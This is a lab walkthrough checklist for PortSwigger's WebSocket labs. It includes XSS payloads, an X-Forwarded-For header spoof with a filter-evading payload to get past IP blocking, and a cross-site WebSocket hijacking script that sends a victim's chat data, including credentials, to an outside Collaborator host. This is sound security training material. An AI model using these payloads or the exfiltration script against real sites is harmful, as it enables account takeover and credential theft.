# PortSwigger WebSocket Mystery Lab

> The mystery lab hides the title and description. Use this checklist to **recon first, identify the lab, then execute**.

---

## Phase 1 — Recon (Always Do This First)

- [ ] Open the lab and browse the site normally
- [ ] In Burp, open **Proxy → WebSockets history** — confirm WebSocket traffic is present (look for a `/chat` or similar upgrade request)
- [ ] Open **Proxy → HTTP history** — find the WebSocket handshake (`GET /chat`, `Upgrade: websocket`)
- [ ] Inspect the handshake request: **does it include a CSRF token?**
- [ ] Open the Live Chat feature, send a test message, and observe whether your message is **reflected back in the HTML**
- [ ] Reload the chat page — does the server replay previous messages when you send `READY`?

---

## Phase 2 — Identify the Lab

Use your recon findings to determine which lab you have:

|Observation|Lab|
|---|---|
|Message reflects in HTML, no IP blocking, no CSRF token check|**Lab A** — Manipulating WebSocket messages (XSS)|
|Message reflects in HTML, **IP gets blocked** after XSS attempt|**Lab B** — Manipulating WebSocket handshake (XSS bypass)|
|Sending `READY` replays chat history + handshake has **no CSRF token**|**Lab C** — Cross-site WebSocket hijacking (CSWSH)|

---


## [Manipulating WebSocket messages to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)

- Check if the site is making use of web sockets
- Check if your message is reflecting in the html
- Send the following payload and intercept it in burp:
```html
<img src=1 onerror='alert(1)'>
```
- Notice it will be URL encoded. Change it back to the payload above and send it to the website.

## [Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

- [ ]  Click **Live chat**, send a message, then reload the page
- [ ]  In **Proxy → WebSockets history**, confirm that sending `READY` causes the server to replay past chat messages
- [ ]  In **Proxy → HTTP history**, find the WebSocket handshake request (`GET /chat`, upgrading to `wss://`) — confirm it has **no CSRF token**
- [ ]  Right-click the handshake request → **Copy URL**
- [ ]  Generate a **Burp Collaborator payload** (Collaborator tab → Copy to clipboard)
- [ ]  Go to the **exploit server** and paste the following into the Body, substituting your values:

```html
  <script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
      ws.send("READY");
    };
    ws.onmessage = function(event) {
      fetch('https://YOUR-COLLABORATOR-PAYLOAD', {method: 'POST', mode: 'no-cors', body: event.data});
    };
  </script>
```

- [ ]  Click **View exploit** on yourself first — then **Poll now** in Collaborator to confirm your own chat history arrives as HTTP POST requests
- [ ]  Click **Deliver exploit to victim** on the exploit server
- [ ]  **Poll now** in Collaborator again — examine the incoming requests and find the one containing the victim's **username and password**
- [ ]  Log in with the exfiltrated credentials → lab solved ✓
## [Manipulating the WebSocket handshake to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)

- Check if the site is making use of web sockets
- Check if your message is reflecting in the html
- Send the following payload and intercept it in burp:
```html
<img src=1 onerror='alert(1)'>
```
- Notice your attack is detected and your IP address is blocked. 
- Click reconnect in the repeater and add the following header:
```http
X-Forwarded-For: 1.1.1.1
```
- Send this payload to bypass the XSS protection and solve the lab:
```html
<img src=1 oNeRrOr=alert`1`>
```
